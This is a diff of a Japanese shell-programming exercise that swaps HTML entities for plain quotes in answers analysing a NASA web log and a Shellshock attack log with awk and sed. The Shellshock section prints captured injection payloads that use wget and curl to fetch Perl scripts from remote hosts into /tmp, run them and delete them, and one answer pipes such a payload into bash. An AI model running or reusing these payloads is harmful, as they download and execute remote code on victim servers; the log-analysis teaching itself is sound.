@@ -63,23 +63,23 @@ access.log.shellshock.gzとaccess_log.nasa.gzについて、日付と時刻を�
 ```bash
 ###修正前###
 ueda\@tencore:~/tmp/nasa$ zcat access_log.nasa.gz | head -n 1
-199.72.81.55 - - [01/Jul/1995:00:00:01 -0400] &quot;GET /history/apollo/ HTTP/1.0&quot; 200 6245
+199.72.81.55 - - [01/Jul/1995:00:00:01 -0400] "GET /history/apollo/ HTTP/1.0" 200 6245
 ###修正後###
 ueda\@tencore:~/tmp/nasa$ cat access_log | head -n 1
-19950701 000001 199.72.81.55 - - [01/Jul/1995:00:00:01 -0400] &quot;GET /history/apollo/ HTTP/1.0&quot; 200 6245
+19950701 000001 199.72.81.55 - - [01/Jul/1995:00:00:01 -0400] "GET /history/apollo/ HTTP/1.0" 200 6245
 ```
 
 <h2>解答</h2>
 
 ```bash
 ueda\@tencore:~/tmp/nasa$ zcat access_log.nasa.gz | awk '{print $4,$0}' |
- sed 's/^\\[//' | awk '{gsub(/[\\/:]/,&quot; &quot;,$1);print}' |
- awk '{$2=$2==&quot;Jul&quot;?&quot;07&quot;:$2;$2=$2==&quot;Aug&quot;?&quot;08&quot;:$2;print}' |
- sed 's;^\\(..\\) \\(..\\) \\(....\\) \\(..\\) \\(..\\) \\(..\\);\\3\\2\\1 \\4\\5\\6;' &gt; access_log
+ sed 's/^\\[//' | awk '{gsub(/[\\/:]/," ",$1);print}' |
+ awk '{$2=$2=="Jul"?"07":$2;$2=$2=="Aug"?"08":$2;print}' |
+ sed 's;^\\(..\\) \\(..\\) \\(....\\) \\(..\\) \\(..\\) \\(..\\);\\3\\2\\1 \\4\\5\\6;' > access_log
 ueda\@tencore:~/tmp/danger$ zcat access.log.shellshock.gz | awk '{print $4,$0}' |
- sed 's/^\\[//' | awk '{gsub(/[\\/:]/,&quot; &quot;,$1);print}' |
+ sed 's/^\\[//' | awk '{gsub(/[\\/:]/," ",$1);print}' |
  sed -e 's/Sep/09/' -e 's/Oct/10/' -e 's/Nov/11/' -e 's/Dec/12/' |
- sed 's;^\\(..\\) \\(..\\) \\(....\\) \\(..\\) \\(..\\) \\(..\\);\\3\\2\\1 \\4\\5\\6;' &gt; danger_log
+ sed 's;^\\(..\\) \\(..\\) \\(....\\) \\(..\\) \\(..\\) \\(..\\);\\3\\2\\1 \\4\\5\\6;' > danger_log
 ```
 
 ちゃんと変換できているか確認する方法は、例えば次の通り。
@@ -99,7 +99,7 @@ NASAのログを各日付のファイルに分けておきましょう。ログ�
 やり方を知っていれば簡単ですね。
 
 ```bash
-ueda\@tencore:~/tmp/nasa$ cat access_log | awk '{print $0 &gt; $1}' 
+ueda\@tencore:~/tmp/nasa$ cat access_log | awk '{print $0 > $1}' 
 ```
 
 
@@ -159,7 +159,7 @@ Q3-2については高速な方法を考えてみてください。
 （Q3-1）次のように木曜日。
 
 ```bash
-ueda\@tencore:~/tmp/nasa$ awk '{print $1}' access_log | date -f - &quot;+%w&quot; |
+ueda\@tencore:~/tmp/nasa$ awk '{print $1}' access_log | date -f - "+%w" |
  LANG=C sort | uniq -c | sort -k1,1n
  317276 0
  318046 6
@@ -239,7 +239,7 @@ ShellShockログについて、レスポンスのデータ送信量が大きい�
 
 ```bash
 ueda\@tencore:~/tmp/danger$ zcat access.log.shellshock.gz |
- sed 's/^\\([0-9]\\+\\.[0-9]\\+\\.[0-9]\\+\\.[0-9]\\+\\) .*&quot; [0-9][0-9][0-9] \\([0-9]\\+\\) &quot;.*$/\\1 \\2/' |
+ sed 's/^\\([0-9]\\+\\.[0-9]\\+\\.[0-9]\\+\\.[0-9]\\+\\) .*" [0-9][0-9][0-9] \\([0-9]\\+\\) ".*$/\\1 \\2/' |
  sort -k2,2nr | head
 192.168.0.90 234
 192.168.151.207 234
@@ -262,7 +262,7 @@ NASAのログについて、7月8月のうち、ゼロ件の日を列挙して�
 
 ```bash
 ###ログの存在しない日（解法1: ツーライナーで）###
-ueda\@tencore:~/tmp/nasa$ seq -w 01 31 | awk '{print &quot;199507&quot; $1;print &quot;199508&quot; $1}' | sort &gt; days
+ueda\@tencore:~/tmp/nasa$ seq -w 01 31 | awk '{print "199507" $1;print "199508" $1}' | sort > days
 ueda\@tencore:~/tmp/nasa$ awk '{print $1}' access_log | LANG=C sort -u | cat - days |
  sort | uniq -u
 19950729
@@ -299,16 +299,16 @@ ShellShockのログから、（Q7-1）インジェクションが試みられた
 ueda\@tencore:~/tmp/danger$ cat danger_log | sed 's/^.*()/()/'
 ###Q7-2 コードの掃除###
 ueda\@tencore:~/tmp/danger$ cat danger_log | sed 's/^.*()/()/' |
- sed 's/\\\\&quot;/&quot;/g' | sed 's/\\\\\\\\/\\\\/g' | sed 's/&quot;$//'
+ sed 's/\\\\"/"/g' | sed 's/\\\\\\\\/\\\\/g' | sed 's/"$//'
 ...
-() { :;};/usr/bin/perl -e 'print &quot;Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!&quot;;system(&quot;wget http://192.168.144.163/guide/lx.pl -O /tmp/lx.pl;curl -O /tmp/lx.pl http://192.168.144.163/guide/lx.pl;perl /tmp/lx.pl;rm -rf /tmp/lx.pl*&quot;);'
-() { :;};/usr/bin/perl -e 'print &quot;Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!&quot;;system(&quot;wget -q http://192.168.63.71/android.txt -O /tmp/android.txt;perl /tmp/android.txt;rm -rf /tmp/android*&quot;);'
+() { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!";system("wget http://192.168.144.163/guide/lx.pl -O /tmp/lx.pl;curl -O /tmp/lx.pl http://192.168.144.163/guide/lx.pl;perl /tmp/lx.pl;rm -rf /tmp/lx.pl*");'
+() { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!";system("wget -q http://192.168.63.71/android.txt -O /tmp/android.txt;perl /tmp/android.txt;rm -rf /tmp/android*");'
 ###Q7-3 コードの実行（危ない！）###
 ueda\@tencore:~/tmp/danger$ tail -n 1 danger_log | sed 's/^.*()/()/' |
- sed 's/\\\\&quot;/&quot;/g' | sed 's/\\\\\\\\/\\\\/g' | sed 's/&quot;$//' |
+ sed 's/\\\\"/"/g' | sed 's/\\\\\\\\/\\\\/g' | sed 's/"$//' |
  sed 's/.........//' | bash -vx
-/usr/bin/perl -e 'print &quot;Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!&quot;;system(&quot;wget -q http://192.168.63.71/android.txt -O /tmp/android.txt;perl /tmp/android.txt;rm -rf /tmp/android*&quot;);'
-+ /usr/bin/perl -e 'print &quot;Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!&quot;;system(&quot;wget -q http://192.168.63.71/android.txt -O /tmp/android.txt;perl /tmp/android.txt;rm -rf /tmp/android*&quot;);'
+/usr/bin/perl -e 'print "Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!";system("wget -q http://192.168.63.71/android.txt -O /tmp/android.txt;perl /tmp/android.txt;rm -rf /tmp/android*");'
++ /usr/bin/perl -e 'print "Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!";system("wget -q http://192.168.63.71/android.txt -O /tmp/android.txt;perl /tmp/android.txt;rm -rf /tmp/android*");'
 Content-Type: text/plain
 
 XSUCCESS!
